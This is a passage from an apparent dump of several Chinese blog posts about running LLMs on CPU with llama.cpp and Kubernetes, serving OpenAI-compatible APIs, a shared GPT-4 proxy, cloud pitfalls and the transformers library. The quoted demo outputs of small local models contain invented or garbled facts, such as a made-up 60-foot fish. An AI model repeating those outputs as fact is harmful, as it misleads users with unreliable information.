billions of words of internet text，我学习了很多关于语言、文化和知识的信息。我可以回答问题，提供建议或者与你进行对话。请随时向我提问，我会尽力为您提供有用的回答。 提问:\n计算长为10厘米，宽为5厘米的矩形的面积。 回复:\n为了计算这个矩形的面积，我们需要使用以下公式：面积 = 长 × 宽 在这个例子中，长度是10厘米，宽度是5厘米。所以，面积 = 10厘米 × 5厘米 = 50平方厘米。 提问：\n给出三个保持健康的小贴士。 回复:\n以下是三个建议，可以帮助您保持健康： 有氧运动：每周进行至少150分钟的中等强度有氧运动（如快走、慢跑、游泳或骑自行车），或75分钟高强度有氧运动（如跑步、山地单车或快速游泳）。 蔬菜和水果：每天摄入至少5份水果和蔬菜，包括深绿色蔬菜、莩大比尔类蔬菜和胡萝卜类蔬菜。这有助于摄入足够的纤维、维生素和矿物质，支持身体健康。 控制压力：学会应对生活中的压力，保持良好的心理和情绪状态。尝试瑜伽、深呼吸、散步或冥想等方法来降低紧张和焦虑。 这些建议可以帮助您保持健康，并为身体提供必要的营养和照顾。请根据您的年龄、性别、体重和健康状况进行调整。在开始新的生活方式之前，建议您咨询医生或其他健康专业人士。 看起来回答得还行，无论是 33b 的模型，还是 7b 的模型，都能给出合理的回答。当然，我只是使用了 HuggingFace 的 alpaca-data-gpt4-chinese 数据集进行了少量人工测试。\n4. 性能问题 性能其实是我真正关心的一个问题，因为只有推理需要的资源与现有的资源相匹配，才能够在生产环境中快速部署与使用，否则将会面临高昂的采购成本。\n4.1 CPU、IO 拉满，Mem 使用率低 直接看监控\nIO 拉满 CPU 拉满 值得注意的是物理机器的 CPU 是 40 核的，但最多只能使用 20 核。在 Issues 中看到过调优的一个建议是，CPU 设置为机器的核心数的一半。目前观测到的情况，可能与这个建议有关。\n在 40 核的机器上，推理使用的 CPU 维持在 20 核，无法继续提升。\nMem 使用率低 内存使用率让人很意外，CPU、IO、Mem 使用也太不均衡了，竟然只用了不到 3GB。\n4.1 将内存挂载到文件系统 由于 IO 拉满，我猜测磁盘有瓶颈，约束了推理效率。于是将容器中的模型文件挂载到内存中，再次进行测试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 spec: containers: - env: - name: MODEL value: /models/chinese-alpaca-2-7b-16k.Q4_K_S.gguf image: shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q4_K_S name: model volumeMounts: - mountPath: /mem name: mem dnsPolicy: ClusterFirst initContainers: - command: - sh - -c - cp /models/chinese-alpaca-2-7b-16k.Q4_K_S.gguf /mem image: shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q4_K_S imagePullPolicy: IfNotPresent volumeMounts: - mountPath: /mem name: mem nodeName: nodeX volumes: - emptyDir: medium: Memory name: mem 很可惜的是，推理效率并没有显著提升。那么，磁盘 IO 到底是在干什么呢？推理过程难道只要不到 3GB 的内存吗？如何加速推理过程，是我下一步需要关注的问题。\n5. 一些已经打包好的模型镜像 chinese-alpaca-2-7b-16k Name Quant method Size shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q2_K Q2_K 3.68 GB shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q3_K Q3_K 4.16 GB shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q3_K_L Q3_K_L 4.46 GB shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q3_K_S Q3_K_S 3.81 GB shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q4_0 Q4_0 4.7 GB shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q4_K Q4_K 4.95 GB shaowenchen/chinese-alpaca-2-7b-16k-gguf:Q4_K_S Q4_K_S 4.73 GB vicuna-33b-v1.3 Name Quant method Compressed Size shaowenchen/vicuna-33b-v1.3-gguf:Q2_K Q2_K 12.78 GB shaowenchen/vicuna-33b-v1.3-gguf:Q3_K Q3_K 14.81 GB shaowenchen/vicuna-33b-v1.3-gguf:Q4_K Q4_K 18.24 GB shaowenchen/vicuna-33b-v1.3-gguf:Q5_K Q5_K 21.72 GB shaowenchen/vicuna-33b-v1.3-gguf:Q6_K Q6_K 25.05 GB shaowenchen/vicuna-33b-v1.3-gguf:Q8_0 Q8_0 31.34 GB shaowenchen/vicuna-33b-v1.3-gguf:full full 56.07 GB baichuan2-7b-chat Name Quant method Size shaowenchen/baichuan2-7b-chat-gguf:Q2_K Q2_K 7.59 GB shaowenchen/baichuan2-7b-chat-gguf:Q3_K Q3_K 8.61 GB shaowenchen/baichuan2-7b-chat-gguf:Q3_K_L Q3_K_L 9.23 GB shaowenchen/baichuan2-7b-chat-gguf:Q3_K_S Q3_K_S 7.93 GB shaowenchen/baichuan2-7b-chat-gguf:Q4_0 Q4_0 9.6 GB llama-2-13b-langchain-chat Name Quant method Size shaowenchen/llama-2-13b-langchain-chat-gguf:Q4_K Q4_K 16.7 GB shaowenchen/llama-2-13b-langchain-chat-gguf:Q5_K Q5_K 19.5 GB 在这些模型中，除了 vicuna-33b，其他模型在 20 核 CPU 上都可以流畅推理，即使是 4 位量化也有不错的效果。如果需要量化精度更高的模型，可以去 HuggingFace 下载。\n6. 总结 模型能力会逐步成为维持 IT 系统运作的基础能力。这件事正在发生，也在快速发生，重新构建上层应用迫在眉睫。本篇主要是研究如何在无 GPU 机器上推理大模型的部分笔记，主要内容如下:\n本地容器运行 LLM K8s 快速部署 LLM 测试与使用，Q4 量化就有不错的效果 在推理过程中，IO 拉满，CPU 拉满，Mem 使用率低。Mem 的使用率低和请求并发数量有关。 ","description":"","id":95,"section":"post","tags":["博文","CPU","大模型","LLM","推理"],"title":"使用 CPU 推理 llama 结构的大模型","uri":"https://www.chenshaowen.com/blog/how-to-run-llama-on-cpu.html"},{"content":"1. 大模型部署工具 llama.cpp 大模型的研究分为训练和推理两个部分。训练的过程，实际上就是在寻找模型参数，使得模型的损失函数最小化，推理结果最优化的过程。训练完成之后，模型的参数就固定了，这时候就可以使用模型进行推理，对外提供服务。\nllama.cpp 主要解决的是推理过程中的性能问题。主要有两点优化：\nllama.cpp 使用的是 C 语言写的机器学习张量库 ggml llama.cpp 提供了模型量化的工具 计算类 Python 库的优化手段之一就是使用 C 重新实现，这部分的性能提升非常明显。另外一个是量化，量化是通过牺牲模型参数的精度，来换取模型的推理速度。llama.cpp 提供了大模型量化的工具，可以将模型参数从 32 位浮点数转换为 16 位浮点数，甚至是 8、4 位整数。\n除此之外，llama.cpp 还提供了服务化组件，可以直接对外提供模型的 API 。\n2. 使用 llama.cpp 量化模型 2.1 下载编译 llama.cpp 克隆代码，编译 llama.cpp\n1 2 3 git clone https://github.com/ggerganov/llama.cpp cd llama.cpp make 在目录下会生成一系列可执行文件\nmain：使用模型进行推理 quantize：量化模型 server：提供模型 API 服务 \u0026hellip; 2.2 准备 llamma.cpp 支持的模型 llama.cpp 支持转换的模型格式有 PyTorch 的 .pth 、huggingface 的 .safetensors 、还有之前 llamma.cpp 采用的 ggmlv3。\n在 huggingface 上找到合适格式的模型，下载至 llama.cpp 的 models 目录下。\n1 git clone https://huggingface.co/4bit/Llama-2-7b-chat-hf ./models/Llama-2-7b-chat-hf 2.3 转换为 GGUF 格式 安装依赖 llama.cpp 项目下带有 requirements.txt 文件，直接安装依赖即可。\n1 pip install -r requirements.txt 转换模型 1 2 3 4 5 6 python convert.py ./models/Llama-2-7b-chat-hf --vocabtype spm params = Params(n_vocab=32000, n_embd=4096, n_mult=5504, n_layer=32, n_ctx=2048, n_ff=11008, n_head=32, n_head_kv=32, f_norm_eps=1e-05, f_rope_freq_base=None, f_rope_scale=None, ftype=None, path_model=PosixPath(\u0026#39;models/Llama-2-7b-chat-hf\u0026#39;)) Loading vocab file \u0026#39;models/Llama-2-7b-chat-hf/tokenizer.model\u0026#39;, type \u0026#39;spm\u0026#39; ... Wrote models/Llama-2-7b-chat-hf/ggml-model-f16.gguf vocabtype 指定分词算法，默认值是 spm，如果是 bpe，需要显示指定。\n2.4 开始量化模型 使用 quantize 量化模型 quantize 提供各种精度的量化。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ./quantize usage: ./quantize [--help] [--allow-requantize] [--leave-output-tensor] model-f32.gguf [model-quant.gguf] type [nthreads] --allow-requantize: Allows requantizing tensors that have already been quantized. Warning: This can severely reduce quality compared to quantizing from 16bit or 32bit --leave-output-tensor: Will leave output.weight un(re)quantized. Increases model size but may also increase quality, especially when requantizing Allowed quantization types: 2 or Q4_0 : 3.56G, +0.2166 ppl @ LLaMA-v1-7B 3 or Q4_1 : 3.90G, +0.1585 ppl @ LLaMA-v1-7B 8 or Q5_0 : 4.33G, +0.0683 ppl @ LLaMA-v1-7B 9 or Q5_1 : 4.70G, +0.0349 ppl @ LLaMA-v1-7B 10 or Q2_K : 2.63G, +0.6717 ppl @ LLaMA-v1-7B 12 or Q3_K : alias for Q3_K_M 11 or Q3_K_S : 2.75G, +0.5551 ppl @ LLaMA-v1-7B 12 or Q3_K_M : 3.07G, +0.2496 ppl @ LLaMA-v1-7B 13 or Q3_K_L : 3.35G, +0.1764 ppl @ LLaMA-v1-7B 15 or Q4_K : alias for Q4_K_M 14 or Q4_K_S : 3.59G, +0.0992 ppl @ LLaMA-v1-7B 15 or Q4_K_M : 3.80G, +0.0532 ppl @ LLaMA-v1-7B 17 or Q5_K : alias for Q5_K_M 16 or Q5_K_S : 4.33G, +0.0400 ppl @ LLaMA-v1-7B 17 or Q5_K_M : 4.45G, +0.0122 ppl @ LLaMA-v1-7B 18 or Q6_K : 5.15G, -0.0008 ppl @ LLaMA-v1-7B 7 or Q8_0 : 6.70G, +0.0004 ppl @ LLaMA-v1-7B 1 or F16 : 13.00G @ 7B 0 or F32 : 26.00G @ 7B 执行量化命令\n1 2 3 4 5 ./quantize ./models/Llama-2-7b-chat-hf/ggml-model-f16.gguf ./models/Llama-2-7b-chat-hf/ggml-model-q4_0.gguf Q4_0 llama_model_quantize_internal: model size = 12853.02 MB llama_model_quantize_internal: quant size = 3647.87 MB llama_model_quantize_internal: hist: 0.036 0.015 0.025 0.039 0.056 0.076 0.096 0.112 0.118 0.112 0.096 0.077 0.056 0.039 0.025 0.021 量化之后，模型的大小从 13G 降低到 3.6G，但模型精度从 16 位浮点数降低到 4 位整数。\n3. 使用 llama.cpp 运行 GGUF 模型 由于近期 llama.cpp 项目更新，新的模型格式为 GGUF ，不兼容 GGML 格式。如果需要使用旧的 GGML 格式模型，请切换到 commit a113689。\n3.1 下载模型 在 llama.cpp 项目的首页 https://github.com/ggerganov/llama.cpp 有列举支持的模型\nLLaMA 🦙 LLaMA 2 🦙🦙 Falcon Alpaca GPT4All Chinese LLaMA / Alpaca and Chinese LLaMA-2 / Alpaca-2 Vigogne (French) Vicuna Koala OpenBuddy 🐶 (Multilingual) Pygmalion 7B / Metharme 7B WizardLM Baichuan-7B and its derivations (such as baichuan-7b-sft) Aquila-7B / AquilaChat-7B 去 https://huggingface.co/models 找 GGUF 格式的大模型版本，下载模型文件放在 llama.cpp 项目 models 目录下。\n1 git clone https://huggingface.co/rozek/LLaMA-2-7B-32K-Instruct_GGUF ./models/LLaMA-2-7B-32K-Instruct_GGUF 仓库中包含各种量化位数的模型，Q2、Q3、Q4、Q5、Q6、Q8、F16。量化模型的命名方法遵循: \u0026ldquo;Q\u0026rdquo; + 量化比特位 + 变种。\n量化位数越少，对硬件资源的要求越低，但是模型的精度也越低。\n3.2 大模型推理 在 llama.cpp 项目的根目录，编译源码之后，执行下面的命令，使用模型进行推理。\n1 2 3 4 5 6 7 8 9 10 11 ./main -m ./models/llama-2-7b-langchain-chat-GGUF/llama-2-7b-langchain-chat-q4_0.gguf -p \u0026#34;What color is the sun?\u0026#34; -n 1024 What color is the sun? nobody knows. It’s not a specific color, more a range of colors. Some people say it\u0026#39;s yellow; some say orange, while others believe it to be red or white. Ultimately, we can only imagine what color the sun might be because we can\u0026#39;t see its exact color from this planet due to its immense distance away! It’s fascinating how something so fundamental to our daily lives remains a mystery even after decades of scientific inquiry into its properties and behavior.” [end of text] llama_print_timings: load time = 376.57 ms llama_print_timings: sample time = 56.40 ms / 105 runs ( 0.54 ms per token, 1861.77 tokens per second) llama_print_timings: prompt eval time = 366.68 ms / 7 tokens ( 52.38 ms per token, 19.09 tokens per second) llama_print_timings: eval time = 15946.81 ms / 104 runs ( 153.33 ms per token, 6.52 tokens per second) llama_print_timings: total time = 16401.43 ms 当然，也可以用上面量化的模型进行推理。\n1 2 3 4 5 6 7 8 9 10 11 ./main -m ./models/Llama-2-7b-chat-hf/ggml-model-q4_0.gguf -p \u0026#34;What color is the sun?\u0026#34; -n 1024 What color is the sun? sierp 10, 2017 at 12:04 pm - Reply The sun does not have a color because it emits light in all wavelengths of the visible spectrum and beyond. However, due to our atmosphere\u0026#39;s scattering properties, the sun appears yellow or orange from Earth. This is known as Rayleigh scattering and is why the sky appears blue during the daytime. [end of text] llama_print_timings: load time = 90612.21 ms llama_print_timings: sample time = 52.31 ms / 91 runs ( 0.57 ms per token, 1739.76 tokens per second) llama_print_timings: prompt eval time = 523.38 ms / 7 tokens ( 74.77 ms per token, 13.37 tokens per second) llama_print_timings: eval time = 15266.91 ms / 90 runs ( 169.63 ms per token, 5.90 tokens per second) llama_print_timings: total time = 15911.47 ms 四位量化模型，在没有 GPU 的情况下，基本能够实现实时推理。敲完命令，按回车，就能看到模型的回复。\nmain 命令有一系列参数可选，其中比较重要的参数有：\n-ins 交互模式，可以连续对话，上下文会保留\n-c 控制上下文的长度，值越大越能参考更长的对话历史（默认：512）\n-n 控制回复生成的最大长度（默认：128）\n\u0026ndash;temp 温度系数，值越低回复的随机性越小\n3.3 交互模式下，使用模型 1 2 3 4 5 6 7 8 9 ./main -m ./models/llama-2-7b-langchain-chat-GGUF/llama-2-7b-langchain-chat-q4_0.gguf -ins \u0026gt; 世界上最大的鱼是什么？ 卡加内利亚鲨为世界最大的鱼，体长达60英尺（18）。牠们的头部相当于一只小车，身体非常丑，腹部有两个气孔，气孔之间还有一个大口径的鳃，用于进行捕食。牠们通常是从水中搴出来到陆地上抓到的小鱼，然后产生大量液体以解脱自己的身体。 \u0026gt; 现在还有这种鱼吗？ 作者所提到的“卡加内利亚鲨”，应该是指的是“卡加内利亚鳄”。卡加内利亚鳄是一种大型淡水肉食性鱼类，分布于欧洲和非洲部分区域。这种鱼的体长最大可达60英尺（18），是世界上已知最大的鱼之一。 不过，现在这种鱼已经消失了，因为人类对戒备和保护水生生物的意识程度低下，以及环境污染等多方面原因。 交互模式下，以对话的形式，有上下文的连续使用大模型。\n4. 提供模型 API 服务 有两种方式，一种是使用 llama.cpp 提供的 API 服务，另一种是使用第三方提供的工具包。\n4.1 使用 llama.cpp server 提供 API 服务 前面编译之后，会在 llama.cpp 项目的根目录下生成一个 server 可执行文件，执行下面的命令，启动 API 服务。\n1 2 3 4 5 6 7 8 9 10 ./server -m ./models/llama-2-7b-langchain-chat-GGUF/llama-2-7b-langchain-chat-q4_0.gguf --host 0.0.0.0 --port 8080 llm_load_tensors: mem required = 3647.96 MB (+ 256.00 MB per state) .................................................................................................. llama_new_context_with_model: kv self size = 256.00 MB llama_new_context_with_model: compute buffer total size = 71.97 MB llama server listening at http://0.0.0.0:8080 {\u0026#34;timestamp\u0026#34;:1693789480,\u0026#34;level\u0026#34;:\u0026#34;INFO\u0026#34;,\u0026#34;function\u0026#34;:\u0026#34;main\u0026#34;,\u0026#34;line\u0026#34;:1593,\u0026#34;message\u0026#34;:\u0026#34;HTTP server listening\u0026#34;,\u0026#34;hostname\u0026#34;:\u0026#34;0.0.0.0\u0026#34;,\u0026#34;port\u0026#34;:8080} 这样就启动了一个 API 服务，可以使用 curl 命令进行测试。\n1 2 3 4 5 6 curl --request POST \\ --url http://localhost:8080/completion \\ --header \u0026#34;Content-Type: application/json\u0026#34; \\ --data \u0026#39;{\u0026#34;prompt\u0026#34;: \u0026#34;What color is the sun?\u0026#34;,\u0026#34;n_predict\u0026#34;: 512}\u0026#39; {\u0026#34;content\u0026#34;:\u0026#34;.....\u0026#34;,\u0026#34;generation_settings\u0026#34;:{\u0026#34;frequency_penalty\u0026#34;:0.0,\u0026#34;grammar\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;ignore_eos\u0026#34;:false,\u0026#34;logit_bias\u0026#34;:[],\u0026#34;mirostat\u0026#34;:0,\u0026#34;mirostat_eta\u0026#34;:0.10000000149011612,\u0026#34;mirostat_tau\u0026#34;:5.0,......}} 4.2 使用第三方工具包提供 API 服务 在 llamm.cpp 项目的首页 https://github.com/ggerganov/llama.cpp 中有提到各种语言编写的第三方工具包，可以使用这些工具包提供 API 服务，包括 Python、Go、Node.js、Ruby、Rust、C#/.NET、Scala 3、Clojure、React Native、Java 等语言的实现。\n以 Python 为例，使用 llama-cpp-python 提供 API 服务。\n安装依赖 1 pip install llama-cpp-python -i https://mirrors.aliyun.com/pypi/simple/ 如果需要针对特定的硬件进行优化，就配置 \u0026ldquo;CMAKE_ARGS\u0026rdquo; 参数，详情请参数 https://github.com/abetlen/llama-cpp-python 。我本地是 CPU 环境，就没有进行额外的配置。\n启动 API 服务 1 2 3 4 5 6 7 8 9 python -m llama_cpp.server --model ./models/llama-2-7b-langchain-chat-GGUF/llama-2-7b-langchain-chat-q4_0.gguf llama_new_context_with_model: kv self size = 1024.00 MB llama_new_context_with_model: compute buffer total size = 153.47 MB AVX = 1 | AVX2 = 1 | AVX512 = 0 | AVX512_VBMI = 0 | AVX512_VNNI = 0 | FMA = 1 | NEON = 0 | ARM_FMA = 0 | F16C = 1 | FP16_VA = 0 | WASM_SIMD = 0 | BLAS = 1 | SSE3 = 1 | SSSE3 = 1 | VSX = 0 | INFO: Started server process [57637] INFO: Waiting for application startup. INFO: Application startup complete. INFO: Uvicorn running on http://localhost:8000 (Press CTRL+C to quit) 在启动的过程中，可能因缺失一些依赖导致失败，根据提示安装即可。如果提示包版本冲突，则需要单独创建一个虚拟 Python 环境，然后安装依赖。\n使用 curl 测试 API 服务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 curl -X \u0026#39;POST\u0026#39; \\ \u0026#39;http://localhost:8000/v1/chat/completions\u0026#39; \\ -H \u0026#39;accept: application/json\u0026#39; \\ -H \u0026#39;Content-Type: application/json\u0026#39; \\ -d \u0026#39;{ \u0026#34;messages\u0026#34;: [ { \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant.\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;system\u0026#34; }, { \u0026#34;content\u0026#34;: \u0026#34;Write a poem for Chinese?\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;user\u0026#34; } ] }\u0026#39; {\u0026#34;id\u0026#34;:\u0026#34;chatcmpl-c3eec466-6073-41e2-817f-9d1e307ab55f\u0026#34;,\u0026#34;object\u0026#34;:\u0026#34;chat.completion\u0026#34;,\u0026#34;created\u0026#34;:1693829165,\u0026#34;model\u0026#34;:\u0026#34;./models/llama-2-7b-langchain-chat-GGUF/llama-2-7b-langchain-chat-q4_0.gguf\u0026#34;,\u0026#34;choices\u0026#34;:[{\u0026#34;index\u0026#34;:0,\u0026#34;message\u0026#34;:{\u0026#34;role\u0026#34;:\u0026#34;assistant\u0026#34;,\u0026#34;content\u0026#34;:\u0026#34;I am not programmed to write poems in different languages. How about I\u0026#34;},\u0026#34;finish_reason\u0026#34;:\u0026#34;length\u0026#34;}],\u0026#34;usage\u0026#34;:{\u0026#34;prompt_tokens\u0026#34;:26,\u0026#34;completion_tokens\u0026#34;:16,\u0026#34;total_tokens\u0026#34;:42}} 使用 openai 调用 API 服务 1 2 3 4 5 6 7 8 9 10 11 12 # -*- coding: utf-8 -*- import openai openai.api_key = \u0026#39;random\u0026#39; openai.api_base = \u0026#39;http://localhost:8000/v1\u0026#39; messages = [{\u0026#39;role\u0026#39;: \u0026#39;system\u0026#39;, \u0026#39;content\u0026#39;: u\u0026#39;你是一个真实的人，老实回答提问，不要耍滑头\u0026#39;}] messages.append({\u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, \u0026#39;content\u0026#39;: u\u0026#39;你昨晚去哪里了\u0026#39;}) response = openai.ChatCompletion.create( model=\u0026#39;random\u0026#39;, messages=messages, ) print(response[\u0026#39;choices\u0026#39;][0][\u0026#39;message\u0026#39;][\u0026#39;content\u0026#39;]) 1 我没有去任何地方。 这里的 api_key、model 可以随便填写，但是 api_base 必须指向真实服务地址 http://localhost:8000/v1。\n5. 总结 本篇文章主要是介绍 llama.cpp 这个大模型部署工具，主要解决的是推理过程中的性能问题。主要有两个优化点：\nllama.cpp 使用的是 C 语言写的机器学习张量库 ggml llama.cpp 提供了模型量化的工具 接着从 llama.cpp 量化模型开始，一步一步使用 llama.cpp 运行 GGUF 模型，提供模型 API 服务，最后还使用 curl 测试了 API ，使用 Python 库 openai 调用 API 服务验证其兼容 OpenAI API 接口功能。\n6. 参考 https://llama-cpp-python.readthedocs.io/en/latest/install/macos/ https://www.substratus.ai/blog/converting-hf-model-gguf-model/ ","description":"","id":96,"section":"post","tags":["AI","大模型","工具","llama.cpp","博文"],"title":"大模型部署工具 llama.cpp","uri":"https://www.chenshaowen.com/blog/llama-cpp-that-is-a-llm-deployment-tool.html"},{"content":" 2024.06.26 已经下线\n1. 申请到 GPT-4-32K API 了 之前在 Azure 上提交申请使用 GPT-4，前几天收到审核通过的邮件了。\n价格收费如下:\nContext Length Prompt per 1,000 tokens (8k) Completion per 1,000 tokens (32k) 8k $0.03 $0.06 32k $0.06 $0.12 请求限速为 60K TPM，即每分钟最多能处理 60K 个 Tokens。\n2. 使用方式 无需登录，直接访问 https://chatgpt.chenshaowen.com/\n点击设置\n输入访问密码 Access Code 密码是 wwww.chenshaowen.com\n切换模型到 GPT-4-32K 切换回会话，开始使用 3. 额度有限，只够体验一把 GPT-4-32K 收费有点贵，仅提供了一定的额度，大约是公众号广告收入的 1/2 左右。\n上面的使用入口下，GPT-3.5 是可以一直可以使用的，如果发现 GPT-4-32K 不能用了，可以切换回 GPT-3.5。\n","description":"","id":97,"section":"post","tags":["博文","GPT-4","OpenAI"],"title":"有一定免费 GPT-4-32K 额度，需要的粉丝速速体验","uri":"https://www.chenshaowen.com/blog/free-quota-gpt-4-32k-for-fans.html"},{"content":"\n1. 配额限制 每种云上的资源，能用多少是有限制的。\n这是云厂为了防止资源滥用，降低租户之间的相互影响。\n比如，一个账户下的企业项目数、弹性主机的数量、弹性公网 IP 的数量、弹性公网 IP 带宽的大小等。\n因配额不够导致的资源申请失败，很常见；但在弹性业务高峰期，这个问题就会变得很严重。\n如果是自己开发了控制平面，内部的云管平台，尤其要注意这些配额限制，做好监控。\n2. 共享导致的性能问题 云厂有些资源区分独享和共享，共享的价格比独享的便宜很多。\n很多时候，我们出于成本考虑选择了共享的资源，但却给自己挖了一个坑。\n华为云的共享负载均衡开启性能保障模式后，提供并发连接数 5 万、每秒新建连接数 5000、每秒查询数 5000 的保障能力。如果超过这个限制，业务侧就会报错。\n共享类的资源都可能出现类似的问题，SLA 无法保障，或者性能无法保障。\n3. 资源强制升级 云厂为了修复版本漏洞、跟进新特性，会强制升级一些资源。\n云厂的强制升级，通常是热更新，会提前通知使用方，但使用方不一定会关注。\n强制升级其实是一个负责任的行为，需要使用方持续投入精力跟进，但使用方往往会忽略这个事情，认为其吃力不讨好。\n海外的厂商，比如 AWS 就会强制升级 RDS 等数据库，这些数据库的升级，会导致数据库闪断，短时间内无法访问。而 EKS 的升级，是通过替换底层的 EC2 实例来实现的，又非常的平稳。\n关注云厂的通知，积极干预、主动升级比被动升级要好很多。\n4. 云厂之间的参数差异 不同于自建的基础设施，整齐划一，云厂的基础设施参数、配置差异很大。\n比如，重启华为云主机之后，NetworkManager 会覆盖 /etc/resolv.conf 中的 DNS 配置。这其实是配置 DNS 的地方不对所致，但在其他云厂却没碰到这个问题。\n再比如 AWS 支持巨型帧，MTU 可以设置为 9001，但华为云不支持。\n建议自定义基础设施的配置，而不是依赖云厂的默认配置，包括网络、存储、安全组、基础镜像等。事前圈定好这些配置，比事后对齐配置要好很多。\n5. 云厂硬件故障 如果你是大客户，很有可能会经常收到类似这样的提示:\n1 2 3 4 5 6 7 8 9 10 11 12 尊敬的xxx用户： 您好！您账号下xxx区以下RabbitMQ实例由于底层物理机故障，需要迁移 影响：长连接1/3闪断，部分未及时消费消息丢失。 辛苦知悉。实例信息如下： UID: xxx Region: xxx 产品: RABBITMQ_GROUP 有归属项目的实例: 项目名称： 默认项目 实例ID: xxxx 实例名称: 子类型：xxx 云厂经常会出硬件故障，AWS 尤其多，机器实在太旧了。虽然云厂做了冗余和热迁移，但发生时，并不能保证 100% 不受影响，业务会有感知。\n在选择资源规格时，如果能选多 AZ 就选多 AZ，如果能选多 Region 就选多 Region。核心业务要用钱和冗余换稳定性。\n6. 云厂软件故障 云厂的代码也是人写的，有人的地方就有 BUG。\n这是近期一个事故的报告:\n1 2 3 故障根本原因: 代码缺陷。 触发场景: 创建弹性伸缩组活动时，需要下发云主机信息、实例创建、查询实例信息以及同步 ES。由于这个过程耗时过长导致写入 Redis 数据的时间晚于伸缩组中 5 台云主机的创建完成时间(多个接口耗时偏高，累加效果导致整体耗时超出预期)。 控制台收到云平台开机完成消息后，处理弹性伸缩组逻辑时需从 Redis 获取对应信息... 云厂的态度很好，但是不解决问题，只能尽量减少类似事件。越是非头部厂商，软件问题可能会越多。\n建立起对云厂功能的 SLO 指标，对于核心的功能，直接影响业务稳定性的功能要建立监控、告警体系，即时发现、即时反馈给云厂干预解决，否则等业务有问题，事情就变得很紧急了。\n7. 欠费导致无法新建云资源 想不到吧，还有因为欠费导致无法新建云资源的坑。欠费不影响已有资源，但是影响新建资源。\n我就经过过两次因欠费导致无法新建云资源的事件，一次是国内的账户，一次是海外的账户，海外入账周期比较长。\n云厂商提前一晚通知，3，4，5月账单未支付，目前 xxx 账号已欠费，目前我们商务这边已经在申请信用额度扩容了，需要等2天；\n第二天就因为欠费，导致弹性扩容失败，整个上午大家都在催公司打款、催云厂扩充信用额度、转移业务流量。挺浪费运维人力。\n公对公的对账周期长，很容易出现欠费的情况，无上限增加信用额度肯定是不可行的。每次欠费都让云厂紧急处理，会降低云厂对你的服务质量。\n建议和公司财务、云厂协商好，按期付款，信用额度能支持一个周期就好。如果厂商有催款通知，不要拖欠赶紧打款。\n8. 云厂变更时，人为操作失误 缓存服务失联，相关的服务全都异常。云厂解释，搬运其他设备时，同时误操作了线上的四台核心交换机。\n\u0026ldquo;同时关四台核心交换机\u0026rdquo;，无论是不是外包干的，都是云厂流程上极大地失误。\n不多久，另外一个云厂也是因为人为操作失误，导致了大面积的服务不可用。\n原因是，在修改一个带宽配置时，本来是 40Gbps 修改为 50Gbps，但是操作人员误操作，修改为 5Gbps，导致了大面积的服务不可用。\n云厂的这些解释非常离谱，但也不排除他们在掩盖一些更低级的失误。\n","description":"","id":98,"section":"post","tags":["博文","云厂","基础设施","SRE"],"title":"使用云上基础设施遇到的一些坑","uri":"https://www.chenshaowen.com/blog/some-potential-pitfalls-when-using-cloud-infrastructure.html"},{"content":" transformers 是由 Hugging Face 开发的 Python 库，用于在自然语言处理（NLP）任务中使用和训练预训练的 Transformer 模型。它提供了许多强大的工具和功能，使得处理文本数据和构建 NLP 模型变得更加容易。该库广泛应用于各种 NLP 任务，如文本分类、命名实体识别、问答、文本生成等。\n1. transformers 中的 pipeline pipeline 提供了便捷的方式，将分词器、模型处理、后处理器等组合在一起，方便用户使用。\n1 2 3 4 5 6 from transformers import pipeline model_id = \u0026#34;cardiffnlp/twitter-roberta-base-sentiment-latest\u0026#34; pipe = pipeline(\u0026#34;sentiment-analysis\u0026#34;, model=model_id, tokenizer=model_id) pipe(\u0026#34;You\u0026#39;re a dumbass\u0026#34;) pipeline 可选的任务类型有：\naudio-classification，音频分类 automatic-speech-recognition，自动语音识别 conversational，对话 depth-estimation，深度估计 document-question-answering，文档问答 feature-extraction，特征提取\n\u0026hellip; 详细列表可以参数 https://huggingface.co/docs/transformers/main_classes/pipelines\n上面的例子中，显示指定了 tokenizer，其实也可以缺省。模型与分词器是紧密耦合的，缺省情况下 pipeline 会自动选择合适的 tokenizer。\n1 2 3 4 5 6 from transformers import pipeline model_id = \u0026#34;cardiffnlp/twitter-roberta-base-sentiment-latest\u0026#34; pipe = pipeline(\u0026#34;sentiment-analysis\u0026#34;, model=model_id) pipe(\u0026#34;You\u0026#39;re a dumbass\u0026#34;) 使用 pipeline 可以让我们更加专注于任务本身，而不用关心模型、分词器等的细节。\n2. transformers 中的模型类 2.1 关于 Auto Classes 类 在 transformers 中实现了大量的算法模型类，有 Bert 模型的 BertModel 类，有 BART 模型的 BartModel 类，有 GPT 模型的 GPT2Model 类等。\n为了减轻用户使用对应模型时，必须找到对应模型类的负担，AutoModel 类会根据 model 的类型自动选择合适的模型类。\n相同设计思路的还有，AutoConfig、AutoTokenizer 等，称之为 Auto Classes，具体可以参考 https://huggingface.co/docs/transformers/model_doc/auto 。\n2.2 使用 AutoModel 加载模型 1 2 3 4 from transformers import AutoModel model_name = \u0026#34;LinkSoul/Chinese-Llama-2-7b\u0026#34; model = AutoModel.from_pretrained(model_name) 但 AutoModel 只能加载模型，不能调用 generate() 等方法用于生成文本。\n2.3 使用 AutoModelFor 类的使用 AutoModelFor 类是 AutoModel 类的子类，它会自动选择合适的模型类，并且会自动加载对应的配置文件。包括:\nAutoModelForCausalLM, 用于自回归语言模型 AutoModelForMaskedLM, 用于掩码语言模型 AutoModelForSeq2SeqLM, 用于序列到序列的任务模型 AutoModelForQuestionAnswering, 用于问答任务模型 AutoModelForTokenClassification, 用于标记分类任务模型 AutoModelForSequenceClassification, 用于序列分类任务模型 AutoModelForMultipleChoice, 